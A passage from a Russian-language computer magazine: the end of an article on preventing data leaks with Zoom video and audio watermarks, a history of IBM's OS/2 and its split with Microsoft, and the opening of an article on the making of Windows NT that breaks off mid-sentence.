 2. Audio Watermark — функция, которая подмешивает в звуковую дорожку
   специальную  аудиометку, по которой ты  также сможешь  отследить
   источник слива.

Как это включить? Очень просто.
 • Ты должен быть администратором встречи либо владельцем учетной
   записи, которая инициирует встречу.
 • На твоем аккаунте Zoom должен быть включен режим Only authenticated
   users can join meetings, чтобы все пользователи могли быть идентифици‐
   рованы. Включается это в настройках твоей учетной записи на самом пор‐
   тале Zoom через навигационное меню (пункты Account Management →
   Account Settings → вкладка Meetings → Security, на которой следует выб‐
   рать  пункты  Only  authenticated  panelists can  join  webinars или  Only
   authenticated meeting participants and webinar attendees can join meetings
   and webinars («Подключиться к конференциям и вебинарам могут только
    участники, прошедшие аутентификацию»). После чего нужно будет под‐
   твердить изменения.

Включение водяных знаков:
 • На портале Zoom входим в учетную запись.
 • В меню навигации Account Management → Account Settings → вкладка
   Meetings → выбираем раздел Schedule Meeting (в русской версии «Кон‐
   ференции → Запланировать конференцию»).
 • Включаем пункт Add watermark («Добавить водяной знак»).
 • Для добавления водяного знака в аудиодорожку включаем расположен‐
  ный ниже переключатель «Добавить звуковую метку».
 • Подтверждаем действия и нажимаем на иконку с замком, чтобы поль‐
   зователи не могли выключить эти функции.





                    Включение водяного знака в Zoom

Теперь у каждого пользователя на экране и в записи на видео будет отоб‐
ражаться его собственный адрес электронной почты, помещенный в водяной
знак. Если эта видеозапись впоследствии попадет в паблик, ты без труда
сможешь определить источник утечки.
   Что касается аудиометки, то для того, чтобы идентифицировать поль‐
зователя, надо будет отправить в службу поддержки Zoom запрос, в котором
следует указать ID встречи, дату и время ее проведения, приложив сам
аудио/видеофайл, который обнаружили в утечке.


ВЫВОДЫ

Защита информации требует комплексного подхода, и здесь, как говорится,
спасение утопающих — дело рук самих утопающих. Каждое из решений, будь
то развертывание  собственного  облака, использование водяных  знаков
или применение маяков Canary, служит важным элементом в общей системе,
но только их комплекс даст максимально возможный эффект. Не существует
единого универсального решения, которое гарантирует абсолютную защиту.
Однако комбинация разных методов значительно повышает шансы на то, что
твои файлы однажды не станут достоянием общественности. В итоге успех
в предотвращении утечек зависит от того, насколько грамотно интегрирова‐
ны технические решения в инфраструктуру компании и насколько дисципли‐
нированны ее сотрудники в вопросах информационной безопасности.
GEEK





OS/2 — уникальная ОС, оказавшая сильное
влияние на историю  компьютеров. Соз‐
данная  в  амбициозном союзе  Microsoft
и IBM, она должна была заменить MS-DOS
и едва не стала новым стандартом для ПК.       Валентин Холмогоров                                                                               Ведущий редактор
Но по иронии судьбы именно OS/2 подтол‐         valentin@holmogorov.ru
кнула Microsoft развивать Windows, ставшую
самой популярной ОС в мире. OS/2 про‐
ложила  путь для  конкурента и  осталась
в тени его успеха. История этой системы
полна   интриг,   технических   прорывов
и неожиданных поворотов.


В восьмидесятые годы наступила эпоха персоналок, а монструозные мей‐
нфреймы стали понемногу уходить в историю. Почувствовав эти перемены,
в 1984 году корпорация IBM анонсировала новое поколение персональных
компьютеров — IBM PC/AT, для которых нужна была собственная операци‐
онная система. Так началось развитие платформы OS/2, которую наши
соотечественники ласково называли «полуосью».
   Лично я впервые услышал об OS/2 на одной из фидошных тусовок: кто‑то
из держателей нод хвастался, что на его машине софт крутится под «очень
крутой» операционкой, да еще и с навороченным графическим интерфейсом.
Во времена, когда большинство юзеров наслаждалось аскетизмом MS-DOS,
слегка  разбавленным  «командиром  Нортоном»  или DOS  Navigator’ом,
а машина, способная потянуть Windows 3.1, считалась предметом роскоши,
описание «полуоси» казалось чем‑то из области фантастики. О существо‐
вании Windows NT мы тогда даже не подозревали. Тем интереснее было
разузнать, что же это за чудесная «полуось» установлена на компьютере
нашего уважаемого коллеги и что она собой представляет.


ДО OS/2

Развернуть  на  сто  восемьдесят  градусов  огромную  бюрократическую
машину, которой была корпорация IBM на рубеже 70-х и 80-х годов, — задача
весьма трудоемкая. Обычно крупные компании, успешно занявшие свою
нишу на рынке, не хотят ничего менять: зачем, если деньги и так исправно
поступают на банковский счет? IBM строила большие электронно‑вычис‐
лительные машины для корпоративных заказчиков, а к рынку бытовых пер‐
соналок относилась снисходительно и скептически. Не потому, что не верила
в его перспективы (хотя и это тоже), а потому, что у корпорации просто
не имелось розничной инфраструктуры для продажи ПК и их сервисного
обслуживания, а строить ее с нуля казалось слишком накладным мероп‐
риятием. Руководители IBM по‑настоящему зашевелились, только когда их
клюнул в интимное место жареный петух в виде Apple, Commodore и Tandy,
да и то не потому, что персоналки стремительно завоевывали популярность
в качестве домашних компьютеров, а потому, что они стали все чаще появ‐
ляться на столах офисных работников и спрос на мейнфреймы начал неумо‐
лимо падать.
   Любое железо мертво без софта, это прекрасно понимали в IBM. Рабочая
группа, состоявшая из руководителей корпорации и инженеров, которые
занимались развитием проекта IBM PC, с самого начала решила не рас‐
пылять ресурсы и сосредоточить усилия на аппаратной части будущей пер‐
соналки, отдав разработку программного обеспечения, как сказали бы сей‐
час, на аутсорсинг. Это стало очень смелым решением, поскольку ранее
в IBM самостоятельно проектировали оборудование и писали для него софт,
но именно оно вывело в итоге IBM PC в лидеры на рынке ПК.
   Участник той самой рабочей группы Джек Сэмс позже вспоминал об этом
так: «Причины были внутренними. У нас имелась ужасная проблема с судеб‐
ными исками от людей, утверждавших, что мы украли их интеллектуальную
собственность. Для нас было чересчур дорого заставлять наших прог‐
раммистов смотреть код, выискивая куски, которые принадлежали кому‑то
другому, потому что иначе эти люди потом вернулись бы к нам и сказали, что
мы украли их программы и заработали на этом кучу денег. Мы проиграли
серию судебных разбирательств по этому поводу и потому не хотели, чтобы
новый продукт разрабатывался людьми из IBM. Вот почему мы обратились
в Microsoft с предложением создать для нас операционную систему».
  В июле 1980 года группа эффективных менеджеров из IBM десантирова‐
лась в офисе Microsoft, и спустя несколько месяцев напряженных перего‐
воров контракт был подписан. К августу 1981 года, вдохновившись QDOS
от Seattle Computer Products, Microsoft разработала первую версию операци‐
онной системы с командной строкой IBM PC DOS и начала продавать ее
самостоятельно под торговой маркой MS-DOS. Несмотря на наличие своей
собственной операционки, в IBM до конца не верили в ее успех, поэтому пер‐
вые IBM PC, помимо PC DOS, комплектовались еще CP/M-86. Хотя поначалу
IBM PC DOS и MS-DOS были практически идентичны, к осени 1984 года в IBM
сформировалась своя группа программистов для работы над этим проектом,
и со временем обе команды стали вносить собственные дополнения в ОС,
благодаря чему в этих операционных системах начали копиться различия.
   Однако ближе к середине 1980-х стало ясно: чтобы успешно конкуриро‐
вать с Apple и другими молодыми и амбициозными производителями пер‐
сональных компьютеров, командной строки уже недостаточно, требовались
многозадачность и графический интерфейс. Именно такую операционную
систему IBM и решила создать для своей линейки персональных компьюте‐
ров — и снова в альянсе с Microsoft.


РОЖДЕНИЕ «ПОЛУОСИ»

Принципиально новую операционную  систему в IBM  планировали  раз‐
работать для семейства персональных компьютеров  второго поколения
под рабочим наименованием Personal System/2, или PS/2, в основе которых
лежал процессор Intel 80286. Именно отсюда и берет свое название сама
операционная система: Operating System/2, или OS/2, хотя бета‑версию
называли CP/DOS. Согласно задумке, операционка должна была поддержи‐
вать защищенный режим, многозадачность и иметь оконный интерфейс,
но при этом обеспечивать совместимость со старыми программами для PC
DOS и MS-DOS. Договор между IBM и Microsoft о создании новой системы
был подписан в августе 1985 года: со стороны IBM проект возглавил ведущий
разработчик Эд Якобуччи, а со стороны Microsoft разработку курировал лично
Билл Гейтс.
   Персоналки второго поколения PS/2 появились на рынке в 1987 году, и в
декабре того же года была выпущена OS/2 1.0, но она все еще оставалась
операционной системой с командной строкой — графический интерфейс
к «полуоси» прикрутили только год спустя в версии 1.1. Вместе с тем это был
значительный шаг вперед по сравнению с MS-DOS: под OS/2 можно было
запускать  несколько  программ  одновременно и  переключаться  между
задачами нажатием сочетания клавиш Ctrl + Esc, операционка имела встро‐
енную подсистему API с подключаемыми динамическими библиотеками.
OS/2 поддерживала мышь и могла работать в защищенном режиме, благода‐
ря чему программисты получили возможность писать работающие в этом
режиме программы без необходимости обращаться напрямую к железу
и дергать прерывания.
   Между тем в Microsoft параллельно трудились над собственной графичес‐
кой оболочкой для MS-DOS под названием Windows, и тянуть два проекта
одновременно с каждым днем становилось все сложнее и сложнее. Время
шло, сроки подготовки GUI для OS/2 давно истекли, и, чтобы наверстать упу‐
щенное, а заодно сэкономить ресурсы, в Microsoft просто присобачили
к OS/2 1.1 оконный интерфейс от Windows 2.0, а в 1989 году, с выходом
Microsoft Windows 3.0, обновленный интерфейс из этой системы вместе
с  красивыми  псевдотрехмерными  рамочками и  кнопками  перекочевал
в OS/2 1.2.





  Microsoft Windows 3.0 (сверху) и IBM OS/2 1.2 (снизу). Как говорится,
  найди десять отличий

Вместе с тем в версии 1.2 «полуоси» появились и принципиальные новинки:
поддержка файловой системы HPFS (до этого OS/2, как и DOS, использовала
FAT), а также операционка научилась работать в локальной сети на основе
протокола TCP/IP — полноценная поддержка сетей в Windows появилась
только в версии 3.11 for Workgroups.


РАЗВОД И ТАПОЧКИ В ПОСЫЛКЕ

Примерно до 1990 года оба семейства системных платформ существовали
параллельно, почти не мешая друг  другу: Windows 2 и 3.x царствовала
на домашних персоналках пользователей, в то время как OS/2 предпочитали
устанавливать на рабочих станциях, серверах и активно внедряли в кор‐
поративных сетях. Но в конце 1988 года Microsoft решила самостоятельно
освоить «корпоративный» сегмент рынка, создав операционную систему
для нескольких независимых аппаратных платформ, включая IBM PC, а кон‐
кретно — компьютеров на базе i386. Новую ОС можно было бы использовать
на рабочих станциях и на серверах, подключенных к локальной сети. Проект
назвали New Technology (NT), и эта разработка в итоге внесла окончательный
раскол во взаимоотношения Microsoft и IBM.
  Но основной причиной стали все же различия в маркетинговом подходе
двух компаний. Будучи гениальным менеджером, Гейтс сумел договориться
с независимыми производителями и сборщиками IBM-совместимых компь‐
ютеров о том, что их персоналки будут поставляться пользователю уже с пре‐
дустановленной Windows  3.1, а стоимость операционной системы будет
включена в цену машины. Кроме того, Windows «из коробки» поддерживала
значительный ассортимент периферии вроде принтеров, модемов, видео-
и звуковых карт благодаря обширной базе драйверов и поставлялась с ком‐
плектом шрифтов, позволявших без проблем оформлять красивые докумен‐
ты. Что еще нужно простым труженикам офисов?
  В IBM, наоборот, делали ставку на поддержку только оборудования собс‐
твенного производства и собственных проприетарных шрифтов, а сама ОС
продавалась отдельно от компьютера и стоила довольно серьезных денег.
В результате к началу 1990-х Windows расходилась многомиллионными
тиражами, принося Microsoft неплохой профит, а OS/2 значительно отставала
в рейтингах популярности.
   Возникали разногласия и с точки зрения подходов к работе. В IBM платили
программистам за количество строк кода, поэтому те старались вовсю,
перегружая исходники OS/2 ненужными компонентами и многостраничными
комментариями. Парни из IBM ругали майкрософтовцев за полное отсутствие
пояснений в коде, а те, наоборот, жаловались на то, что код их коллег из IBM
похож на «Войну и мир». Сотрудники из Рэдмонда вспоминали, что любые
рабочие вопросы в IBM решались месяцами на многочисленных собраниях,
митингах и встречах, даже те, которые нужно было разрулить по возможности
быстро. Последней каплей стало требование IBM полностью изменить API
операционной системы ради  поддержки  16-битного  сегментированного
режима памяти в процессоре Intel 80286. Эту поддержку IBM обещала своим
клиентам, покупавшим компьютеры второго поколения во многом ради нее,
но она же ставила крест на программной совместимости OS/2 и MS-DOS.
Кроме того, OS/2 работала в 16-битном защищенном режиме и, следова‐
тельно, не могла извлечь выгоду из более простой 32-битной модели памяти
i386, что и послужило основной причиной запуска в Microsoft независимого
проекта NT.
   Конфликт интересов стал слишком глобальным, а команда Дэйва Катлера,
возглавившего проект NT в Microsoft, составляла серьезную конкуренцию
группе разработчиков «полуоси» из IBM. И наконец соглашение о сотрудни‐
честве в 1990 году было расторгнуто: вся дальнейшая работа над OS/2 пол‐
ностью сосредоточилась в недрах IBM, а сотрудники Microsoft, трудившиеся
над OS/2 версии 2.0, перешли в команду NT.


ПОСЛЕ MICROSOFT

Последней версией OS/2, в создании которой принимала участие Microsoft,
была 1.3, она же стала последней 16-разрядной версией «полуоси». Релиз
полностью собранной в недрах IBM OS/2 2.0 состоялся в апреле 1992 года.





                         Интерфейс OS/2 2.0

Приложениям OS/2 2.0 предоставляла 32-разрядный API, но часть компонен‐
тов ядра и драйверы были еще 16-разрядными. В отличие от ОС Unix, осно‐
ванной на принципе «все есть файл», OS/2 была построена согласно идеоло‐
гии «все есть объект» — и элементы графического интерфейса под названи‐
ем Workplace Shell, и файлы, и компоненты файловой системы ОС воспри‐
нимала как объекты, с которыми может взаимодействовать пользователь.
   Если под DOS запущенная программа полностью монополизировала
ресурсы  компьютера  (и сбой  в  ней  приводил  к  краху  системы),  то
OS/2 использовала виртуальный режим 8086 процессора Intel i386 для запус‐
ка MS-DOS 5.0 и совместимых с ней приложений в виртуальной машине.
Фактически внутри OS/2 2.0 можно было запустить Windows 3.0, поскольку
сама винда третьей версии была по большому счету приложением для MS-
DOS. Однако OS/2 не умела запускать программы для MS-DOS, работающие
в защищенном режиме с использованием интерфейса Virtual Control Program
Interface, или VCPI (в «полуоси» работали только приложения, поддерживав‐
шие интерфейс DPMI), а вот Windows 3.х с этим прекрасно справлялась.
  Тем не менее основным конкурентом для «полуоси» на рынке по‑преж‐
нему оставалась Windows, но дистрибутив OS/2 стоил в рознице 195 дол‐
ларов, тогда как Windows продавалась за 150, что, конечно же, не добавляло
«полуоси» очков популярности. Именно поэтому разработчики в IBM вынуж‐
дены были всеми силами обеспечивать совместимость своей ОС и Windows,
в основном с использованием виртуальной машины DOS (VDM). Для этого
в OS/2 2.1 была включена практически полная копия Windows 3.1, приложения
для которой могли работать в полноэкранном режиме. При этом прог‐
раммисты старались обеспечить для пользователя «бесшовность»: значки
Windows-приложений появлялись прямо на рабочем столе OS/2, но для их
запуска создавалась виртуальная среда с Windows-окружением. Это поз‐
воляло пользователям «полуоси» не покупать дополнительную лицензию
на Windows у Microsoft и экономить таким образом деньги. Однако, поскольку
OS/2 для обеспечения совместимости запускала только системные ком‐
поненты пользовательского режима Windows, она не поддерживала драй‐
веры устройств VxD.  Соответственно, программы, которым требовались
такие драйверы, в «полуоси» вылетали с ошибкой.
  В Рэдмонде называли такой подход «попыткой нажиться на всеобъемлю‐
щем успехе платформы Microsoft». В Windows 3.11 корпорация намеренно
изменила некоторые компоненты юзермода, чтобы поломать возможность
запуска новых приложений в виртуальной машине OS/2, — в IBM тут же
окрестили этот демарш «преднамеренным актом саботажа Microsoft против
продукта IBM».
  В 1994 году IBM выпустила третью, самую известную версию «полуоси»
под названием OS/2 Warp, ставшую в итоге легендарной. Операционка могла
похвастаться принципиально новым оконным интерфейсом, поддерживала
более широкий ассортимент оборудования, включала приложения муль‐
тимедиа, поддерживала множество протоколов локальных сетей и подклю‐
чение к интернету, а также в комплекте поставки имелся уже готовый пакет
офисных приложений IBM Works.





                          OS/2 Warp

Само название, как нетрудно догадаться, IBM позаимствовала из кинов‐
селенной Star Trek. Сотрудники компании вспоминали, что все бета‑версии
OS/2 имели внутренние «кодовые имена» из «Звездного пути», но только
это приросло к системе настолько, что выбралось в продакшен. Маркетологи
тут же воспользовались такой возможностью попиариться и пригласили
в качестве ведущей презентации OS/2 Warp актрису из Star Trek Кейт Малгрю.
  На рынке были представлены две версии OS/2 Warp: более дешевая
в красной коробке (Red Spine) и более дорогая — в голубой (Blue Spine).
Отличались они… поддержкой Windows. Тем, кто выбрал «красную пилюлю»,
нужно было покупать и устанавливать винду самостоятельно, после чего
OS/2 могла использовать ее компоненты. Проглотившим «голубую пилюлю»
все нужные файлы предоставлялись «из коробки».
   Инновационная, мощная, красивая и современная OS/2 Warp стала безус‐
ловным хитом в мире IT… ровно до тех пор, пока Microsoft в конце того же
года не представила Windows 95. Ну а появление Windows NT 4.0 с тем же
графическим интерфейсом сильно подпортило экспансию OS/2 Warp на кор‐
поративном рынке.
  В 1996 году IBM ответила своему конкуренту выпуском OS/2 Warp 4 —
это была значительно модифицированная версия предыдущей редакции
«полуоси» с обновленным интерфейсом, поддержкой Java, функцией рас‐
познавания речи и интегрированным пакетом Lotus Notes.





                         OS/2 Warp 4

Выпускалась также серверная версия OS/2 Warp 3 и 4, в состав которой вхо‐
дил IBM LAN Server. Но Windows 95 и NT 4 неумолимо завоевывали все боль‐
шую долю рынка, а продажи OS/2 падали. IBM шла на различные ухищрения,
чтобы любыми способами увеличить долю пользователей своей платформы:
так, в Великобритании многотысячными тиражами распространялся бесплат‐
ный LiveCD, который включал в себя полную, не требующую регистрации вер‐
сию OS/2 Warp, причем без какой‑либо защиты от копирования. Естественно,
диск был очень удачно «взломан», благодаря чему систему стало возможно
установить на компьютер и использовать, не заплатив никому ни цента.
В Австралии дистрибутив OS/2 Warp бесплатно распространялся с компь‐
ютерными журналами. Но это не помогло: выход Windows 98 окончательно
похоронил надежды IBM на мировое господство в сегменте ОС для пер‐
сональных компьютеров.
   Теряя рынок, в конце 1996 года в IBM запустили процесс внутреннего
аудита проекта OS/2, результат которого однозначно  свидетельствовал:
«OS/2 — нежизнеспособная операционная система в плане возможности
удержать рынок ПК». Код «полуоси» был очень раздут и перегружен, объем
патчей и обновлений по мегабайтам превышал объем самой операционной
системы. Кроме того, разработка велась слишком медленно из‑за неп‐
равильной организации производственного процесса: как гласил отчет, «все
отчитывались перед всеми, что хаотизировало принятие решений». IBM поп‐
росту не могла угнаться за Microsoft.
  В итоге в 1998 году руководство корпорации приняло решение сократить
бюджет отдела разработки OS/2 на 95% и уволить порядка 1300 прог‐
раммистов и специалистов технической поддержки (часть которых перешла
потом в Microsoft). Это и стало концом истории «полуоси»: в 2001 году IBM
прекратила дальнейшее развитие OS/2. Но, как это бывает, конец любой
истории — это всегда начало другой. О том, что произошло с «полуосью»
после официального закрытия проекта, я расскажу в следующий раз.


ЗАКЛЮЧЕНИЕ

В  попытке  удержаться на  рынке системных платформ для персоналок
в 1995 году IBM пошла на отчаянный шаг. Осознав, что Microsoft стала фак‐
тически монополистом в сегменте IBM PC — на минуточку, персональных
компьютеров,  стандарт которых  разработала сама IBM, — корпорация
решила отправиться по стопам Apple и кардинально сменить платформу, осу‐
ществив переход с процессоров Intel на архитектуру PowerPC. Это позволило
бы, с одной стороны, накрутить хвост Биллу Гейтсу, выпустив на рынок новую
персоналку со своей собственной ОС, с другой — составить конкуренцию
«Макинтошам».
  Для этого в IBM запустили разработку операционной системы для PPC
под названием Workplace OS. IBM начинала с чистого листа: это был совер‐
шенно новый проект с собственным микроядром, который заимствовал лишь
небольшую часть кода OS/2 и отдельные компоненты пользовательского
интерфейса. Было собрано несколько прототипов персоналок IBM с процес‐
сорами PowerPC и альфа‑версией Workplace OS, но корпорация вовремя
одумалась, и проект свернули. Все‑таки глобальная смена процессорной
платформы — огромный риск сродни ставки на «зеро», на которой можно
потерять слишком многое. Такой финт ушами смогла провернуть только
Apple, причем дважды. Возможно, решись IBM идти до конца, в истории опе‐
рационных систем этой компании открылась бы новая страница.
GEEK





В этой статье нет глубоких рассуждений
об   устройстве   операционных   систем:
управлении памятью, планировании выпол‐
нения на CPU, о процессах и потоках, вво‐
де‑выводе и других сопутствующих темах.      Юрий "yurembo" Язев                                                                                    Программист, разработчик
Зато в ней кратко изложена история соз‐        видеоигр, независимый                                                                                            исследователь
дания операционной системы Windows NT,                 t2d-dev.ru
которая лежит в основе всех современных
версий Windows.


Как ты наверняка знаешь, до 2001 года, то есть до релиза Windows XP, сущес‐
твовали две ветви развития операционной системы Windows: Windows, осно‐
ванная на DOS, и Windows, основанная на NT. В итоге победила вторая, став‐
шая предком для всех современных версий Windows. Между тем к Windows
на основе DOS относятся Windows 1.0–3.0, Windows 3.1, 3.11, Windows 95,
Windows 98, Windows ME.
  С Windows на основе DOS все понятно, к существующей 16-разрядной
операционной системе MS-DOS, изначально купленной на стороне, прик‐
рутили графический интерфейс. Вместе они служили верой и правдой. Одна‐
ко через некоторое время в Microsoft пришли к тому, что рано или поздно
понадобится абсолютно новая операционная система, основанная на 32-
битной архитектуре без старого багажа.
   Несколько лет спустя этой новой системой стала NT — для своего вре‐
мени революционная ОС. Как раз об истории ее создания и пойдет речь
в этой статье.


SHOWSTOPPER

Мне нравится читать книги об истории программных продуктов, основателях
софтверных компаний и просто о людях, оставивших след в истории компь‐
ютерной эры. В этот список входят такие книги, как «Just for Fun» Линуса Тор‐
вальдса, размышления о будущем, принадлежащие Биллу Гейтсу, рассужде‐
ния о программировании в книге «Мифический человеко‑месяц» Фредерика
Брукса, «Время UNIX» Брайана Кернигана и другие. До недавнего времени
из книг этого жанра мне больше всего нравилась работа Карен Саусвик «Все
вокруг должны разориться», повествующая, как ни странно, о великом и ужас‐
ном Ларри Эллисоне.
   Между тем, переворачивая страницы изданий об архитектуре операци‐
онных систем, в конце одного из томиков я наткнулся на следующую ссылку:
Zachary, G. Pascal (1994). Showstopper! The Breakneck Race to Create Windows
NT and the Next Generation at Microsoft. Warner Books. ISBN 0-02-935671-7.
Сначала я был удивлен: как так, я до сих пор не прочитал книгу об истории
создания одной из самых выдающихся операционных систем всех времен
и народов? Причина вскоре стала для меня очевидной, да песнь не об этом.
   Недолгие поиски в сети дали результаты: на винт моего компа был слит
PDF-файл, содержащий эту книгу. Конечно, книги надо покупать в магазинах
в бумажном виде, но меня посетило сомнение, что в три часа ночи в ближай‐
шем книжном магазине нашего городка найдется книга тридцатилетней дав‐
ности на английском языке. Короче, пришлось довольствоваться тем, что
есть: не такой уж и плохой вариант.


             INFO

                          Общеизвестный перевод  слова showstopper —
                           представление, спектакль; менее распространен‐
                     ный — накладка, неисправность. Но в данном кон‐
                          кретном случае во время разработки системы NT
                      этим термином называли критический баг, при‐
                        водивший к сбою в работе системы; кроме него,
                          существовали баги первого и второго приори‐
                          тетов, находившиеся после showstopper.


Книгу логичнее отнести к художественному, нежели к техническому литера‐
турному жанру, из‑за этого лично мне было тяжеловато ее читать. В весьма
небольшое количество страниц автору удалось вместить невероятный объем
информации. Он вкратце рассказал о биографии Дэвида Катлера: о трудном
детстве, о его юности, когда тот занимался спортом, но в связи с тяжелой
травмой был вынужден оставить эти занятия. О его карьере, в частности
о промежутке жизни, когда тот работал в Digital Equipment. О потрясающих
успехах компьютеров (PDP, VAX) и операционных системах (VMS) этой ком‐
пании. Наконец, о завершении работы в DEC.


С ЧЕГО ВСЕ НАЧАЛОСЬ?

Во многих источниках говорится о том, что в конце восьмидесятых Катлер
просто уволился из Digital и перешел в Microsoft, но на самом деле это было
далеко не так. У Дэвида был тяжелый жизненный период, когда руководство
DEC отвергало многие его проекты современных операционных систем.
В это время Дэйв был в Сиэтле, где под началом Digital открыл компанию
для разработки компьютера PRISM и операционной системы Mica для него.
Тем не менее эти начинания тоже были отвергнуты начальством в 1988 году,
что поставило крест на бизнесе Дэйва.
   Катлер пребывал в подавленном состоянии.  Буквально в  нескольких
километрах в Сиэтле Билл Гейтс искал разработчика операционных систем,
который мог бы руководить процессом создания переносимой — не завися‐
щей от архитектуры ЭВМ — операционной системы. Он слышал о достижени‐
ях Катлера и, узнав, что тот находится с ним в одном городе, пригласил
Дэвида на собеседование. Катлеру, только что потерявшему бизнес, мало
что оставалось. С этого момента и началась история Windows NT. Кроме все‐
го прочего, Дэйв с презрением относился к Unix, и работа в Microsoft давала
ему шанс создать операционную систему, которая окажется лучше и совер‐
шеннее.
   Кроме биографии Дэвида Катлера, автор рассказывает о биографии Гей‐
тса. Казалось бы, можно ли узнать что‑то новое об этом человеке? Оказыва‐
ется, можно.
   Основную часть книги автор посвящает, конечно же, разработке Windows
NT, в подробностях описывая решения менеджмента группы разработки, вза‐
имоотношения между членами команды и прочие картины внутренней кухни
Microsoft. Много внимания  уделяется отдельным участникам разработки,
и это не только программисты, но и тестеры, билдеры, технические писатели.
Кратко обрисованы их жизненные пути, обстоятельства, которые привели их
в группу NT. В книге есть описание корпорации Microsoft изнутри на начало
девяностых.  Конечно, с того времени много что изменилось, но даже
это поражает воображение. Прямо в кампусах, где ведется разработка ПО,
находились тренажерные залы, бассейны — всё для сотрудников компании.





               Часть владений Microsoft, снимок Bing Maps

После ухода из DEC Катлер привел в Microsoft всю свою команду разработ‐
чиков, тем самым, как замечает автор в эпилоге, организовал компанию внут‐
ри компании, и этому не помешал даже Билл Гейтс. Во многом от этого
и зависел будущий успех Windows NT. Катлер окружил себя уже знакомыми
специалистами, с которыми он годами работал в Digital. Впоследствии прог‐
раммисты из Microsoft тоже начали вливаться в процесс разработки, стали
организовываться дополнительные отделы. Например, графическим отделом
руководил очень своеобразный программист Whitmer, а его команда называ‐
лась «Бессмертные» — Undead.


NT И OS/2

Меня всегда интересовало, какое отношение NT имеет к OS/2. Во многих
источниках приводится довольно разная информация, вплоть до того, что
NT — это продолжение OS/2. Так как книга Showstopper написана в резуль‐
тате общения автора с непосредственными разработчиками системы, мне
кажется, что этому источнику можно доверять. В конце книги Захари перечис‐
ляет лиц, с которыми он провел интервью. Список громадный: фамилии рас‐
положены в двух столбцах и занимают две страницы. В него входят не только
сами сотрудники Microsoft, но и члены их семей: автор показал, как NT пов‐
лияла на личную жизнь участников проекта.
  В конце 1988 года совершенно независимо от OS/2 Дэйв Катлер начал
разработку системы, которую впоследствии маркетологи окрестили New
Technologies, сокращенно NT. До этого времени в подавляющем большинстве
случаев операционные системы разрабатывались непосредственно на языке
ассемблера (исключением стала Unix), тогда как большая часть NT писалась
на C. Это делалось для того, чтобы обеспечить переносимость системы
на другие аппаратные платформы.
  Тем не менее в качестве целевого был выбран процессор i386 от Intel.
Однако сначала NT собирались разрабатывать для процессора i860 —
это представитель интеловской RISC-архитектуры, но из‑за конструкторских
дефектов разработка системы для него была прекращена. В течение некото‐
рого времени создание ОС и тестирование параллельно велись на архитек‐
туре MIPS, в которой Катлер видел будущее. Однако не срослось: от ее под‐
держки после выпуска Windows NT 4.0 тоже отказались. В начале разработки
NT она создавалась как обособленная система, не предполагалась сов‐
местимость ни с DOS, ни с другими версиями Windows, ни с OS/2.
   После начала успешных продаж Windows 3.0 для Microsoft стало очевидно,
что совместный с IBM проект операционной системы OS/2 не оправдал
надежд, но отказываться от такого союзника им тоже не хотелось. Поэтому
под флагом проекта OS/2 они стали скрывать разработку NT. В это же время
стало понятно, что для более широкого распространения NT необходимо
добавить к ней совместимость с основными версиями Windows, дополнив ОС
возможностью выполнения написанных для Windows 3.х приложений.
   Вместе с тем OS/2 также имела небольшой парк программ, от поддержки
которых в новой системе нельзя было отказываться. Узнав об этом, Катлер
был вне себя от злости. Он сказал, что разработка новой системы ведется
уже полтора года без предположения о какой‑либо совместимости со ста‐
рыми ОС, вследствие чего придется вносить изменения в базовый код. Кста‐
ти, именно эта обратная совместимость с Windows и стала в итоге одним
из бедствий, так как речь шла еще о 16-битной Windows, при этом NT изна‐
чально была 32-разрядной. Уже перед самым релизом системы, обнаружив,
что скорость выполнения старых 16-разрядных программ была неудовлетво‐
рительной, релиз несколько раз откладывали для внесения изменений.
   Довольно важным маркетинговым шагом со стороны Microsoft было пере‐
именование NT в Windows NT, поскольку изначально эти две ОС позициони‐
ровались как системы с принципиально разной архитектурой. Катлер сильно
ругался, но понимал, что условия, которые он имел в Microsoft, вряд ли
получит где‑то еще.
   Фактически работа над OS/2 была прекращена, а прокачанные в ее про‐
цессе разработчики стали переходить в проект Windows NT. Руководство
Microsoft продолжало вешать лапшу на уши IBM о том, что разработка
OS/2 продолжается. Но однажды на очередной встрече руководителей раз‐
работки операционных систем Microsoft и IBM последним была представлена
новая система Windows  NT, имеющая  схожий с Windows программный
интерфейс. Те оказались в недоумении, незамедлительно доложили об этом
начальству, но ничего изменить уже не смогли. Разработка OS/2 продол‐
жилась исключительно в IBM, которая так и не смогла сделать из нее ком‐
мерчески успешную операционную систему.
   Ближе к дате релиза все еще оставался нерешенным вопрос об исполь‐
зуемой файловой системе; FAT со своими ограничениями явно не подходила
для 32-битной ОС. Тогда был поднят вопрос о разработке нового стандарта.
Удивительно, одна из самых совершенных файловых систем — NTFS была
создана тремя разработчиками!
   Ведущий разработчик ядра Mach Ричард Рашид в 1991 году присоединил‐
ся к Microsoft для работы над Windows NT в отделе исследований — Microsoft
Research. Так как Катлер проектировал NT, опираясь на результаты, получен‐
ные при проведении исследований для разработки Mach, Рашид сделал нес‐
колько важных рекомендаций для управления памятью, что в итоге позволило
повысить скорость работы Windows NT.


КАК СОБИРАЛИ СИСТЕМУ

Команды разработчиков и тестеров в проекте Windows NT были по разные
стороны баррикад. Тестеры находили баги, программисты отвечали, что в их
коде не может быть багов, тогда тестеры эксплуатировали баг снова и снова,
разработчикам нечего было возразить, и это злило их еще сильнее. Знакомая
картина, не так ли?
  Для билдеров был отведен вместительный офис на первом этаже второго
кампуса Microsoft. Как следует из названия, билдеры готовили результиру‐
ющий билд. Каждый программист работал над своей задачей — собствен‐
ными файлами с кодом, затем компилировал результат в объектные файлы,
которые отправлял в «Билд Лаб». Уже там, собрав последние версии всех
необходимых объектных файлов системы и подготовив нужные скрипты, стар‐
ший билдер запускал процедуру линкования. Эта процедура могла длиться
до 18 часов. Если она завершалась успешно, то получалась сборка операци‐
онной системы, которую в лучшем случае (если никто из программистов
не накосячил и никто из билдеров не забыл прилинковать нужную либу) мож‐
но было протестировать.
   Обычно процесс линковки запускали на ночь, поэтому Катлер, придя
с утра на работу, ждал новый билд. И впадал в ярость, если его не было.
Во время дедлайнов старший билдер ночевал в лаборатории, чтобы никто
не проник внутрь. Поскольку, как обычно бывало, уже после начала процеду‐
ры построения кому‑либо из программистов приходила в голову гениальная
идея внести изменения в свой код и он сломя голову бежал в «Билд Лаб», что‐
бы сделать это. Необходимо было воспрепятствовать этому ради готовности
билда к утру.
   Вот еще один комический случай, произошедший во время разработки
Windows NT. Когда команда Undead реализовала вывод изображений —
битовых образов на экран, первая картинка, которую они вывели посредс‐
твом NT, была фотография обнаженной женщины. Конечно, мужской части
